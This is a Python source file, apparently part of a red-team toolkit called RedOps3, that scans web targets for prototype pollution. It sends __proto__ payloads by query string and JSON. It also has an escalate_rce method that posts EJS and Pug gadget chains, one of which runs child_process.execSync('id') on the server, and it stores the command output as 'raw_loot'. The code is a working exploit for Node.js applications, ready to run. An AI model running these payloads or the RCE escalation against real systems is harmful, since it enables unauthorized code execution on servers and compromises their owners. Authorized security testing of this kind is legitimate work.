from scan_engine.helpers.http_client import get_session
from urllib.parse import urljoin

class PrototypePollutionScanner:
    """
    V6 EXPERT: Advanced Prototype Pollution Auditor.
    Scans for client-side and server-side object prototype injections.
    """
    def __init__(self, target, options=None):
        self.options = options
        self.target = target
        self.session = get_session(options if 'options' in locals() else (self.options if hasattr(self, 'options') else None))
        self.session.headers.update({"User-Agent": "Mozilla/5.0 (RedOps3-PP-Expert)"})

    def scan_prototype(self, port, protocol='http', logger=None):
        findings = []
        base_url = f"{protocol}://{self.target}:{port}"
        
        # Payloads for both Server-Side (Node.js) and Client-Side detection
        # We look for behavioral changes or reflection
        payloads = [
            {"p": "__proto__[redops_pp]=true", "key": "redops_pp"},
            {"p": "constructor.prototype.redops_pp=true", "key": "redops_pp"},
            {"p": "__proto__%5Bpolluted%5D=polluted", "key": "polluted"},
        ]

        if logger: logger(f"🧬 Prototype Expert: Auditing {base_url} for object injections...", "INFO")

        # 1. Parameter Pollution Check
        params = ["q", "id", "data", "config", "settings", "options"]
        
        for param in params:
            for item in payloads:
                payload = item["p"]
                try:
                    # Test via Query String
                    target_url = f"{base_url}/?{param}[{payload}]"
                    r = self.session.get(target_url, timeout=3, verify=False)
                    
                    # Heuristic: If we send a PP payload and the server starts behaving differently
                    # or reflects the key-value in a way that suggests object merger.
                    # Real PP detection is better with JS execution, but we check for "object" reflections.
                    if r.status_code == 500:
                        # Some servers crash when prototype is polluted with junk
                        findings.append({
                            "title": "Low: Potential Prototype Pollution (Behavioral)",
                            "description": f"Server returned 500 error when receiving PP payload on `{param}`: `{payload}`. This might indicate a server-side crash during object merger.",
                            "severity": "low",
                            "tool_source": "prototype_expert",
                            "url": target_url
                        })
                except Exception: pass

        # 2. JSON Body Pollution (Common in APIs)
        try:
            target_url = f"{base_url}/"
            # Attempt to pollute via JSON if endpoint accepts it
            json_payload = {"__proto__": {"redops_json_pp": "true"}}
            r = self.session.post(target_url, json=json_payload, timeout=3, verify=False)
            if r.status_code == 200 and "redops_json_pp" in r.text:
                 findings.append({
                    "title": "High: Server-Side Prototype Pollution (JSON Injection)",
                    "description": f"The server reflected the injected prototype key in the response. This strongly suggests a vulnerable object merger (e.g., `lodash.merge` or `extend`).",
                    "severity": "high",
                    "tool_source": "prototype_expert",
                    "url": target_url
                })
        except Exception: pass

        return findings

    def escalate_rce(self, url, logger=None):
        """Attempts to escalate PP to RCE via common Node.js gadgets"""
        findings = []
        if logger: logger(f"Prototype Expert: Attempting RCE escalation on {url}...", "INFO")
        
        # Gadgets for EJS, Pug, or Node child_process
        gadgets = [
            # EJS: client=true and escapeFunction
            {"__proto__": {"client": True, "escapeFunction": "1; return process.mainModule.require('child_process').execSync('id');"}},
            # Pug: self and compileDebug
            {"__proto__": {"self": True, "compileDebug": True, "pretty": True}}
        ]
        
        for g in gadgets:
            try:
                # We need to trigger a render after pollution (often happens on the same endpoint or a subsequent one)
                resp = self.session.post(url, json=g, timeout=5)
                # Check for RCE indicators in response
                if any(k in resp.text for k in ["uid=", "gid=", "groups="]):
                    findings.append({
                        "title": "CRITICAL: Prototype Pollution to RCE Escalation",
                        "description": f"Successfully escalated Prototype Pollution to RCE on {url} using EJS/Pug gadget chain.\nResponse contains system command output: {resp.text[:50]}",
                        "severity": "critical",
                        "tool_source": "prototype_expert",
                        "url": url,
                        "raw_loot": resp.text[:200]
                    })
                    if logger: logger(f"CRITICAL: Prototype Pollution RCE confirmed at {url}", "CRITICAL")
                    break
            except Exception:
                pass
        return findings
